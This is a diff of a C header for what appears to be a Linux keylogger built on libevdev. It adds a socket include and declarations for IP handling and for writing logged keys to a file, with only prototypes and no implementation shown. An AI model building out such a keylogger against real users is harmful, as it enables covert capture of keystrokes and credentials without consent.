@@ -4,6 +4,8 @@
 #include <ctype.h>
 #include <errno.h>
 #include <fcntl.h>
+// the libevdev library has warnings for the variable names being too short
+// NOLINTNEXTLINE
 #include <libevdev/libevdev.h>
 #include <pthread.h>
 #include <signal.h>
@@ -11,6 +13,7 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <sys/socket.h>
 #include <sys/stat.h>
 #include <sys/types.h>
 #include <unistd.h>
@@ -38,15 +41,9 @@ typedef struct {
   // user. char* host_device_IP;  // A string representing the user's IP.
 } key_package;
 
-/**
- * Documentation here
- */
-void begin_keylogger(void);
-
-/**
- * Documentation here
- */
-void end_keylogger(void);
+// Converts space-delimited IPv4 addresses
+// to dotted-decimal format
+void check_IP_buffer(char* IPbuffer);
 
 /**
  * Logs the current device.
@@ -66,3 +63,5 @@ void reset_structs(key_package* key_package);
  * data for the overall session.
  */
 void print_logged_keys(key_package key_package);
+
+void keys_to_file(FILE* package_log, key_package package);
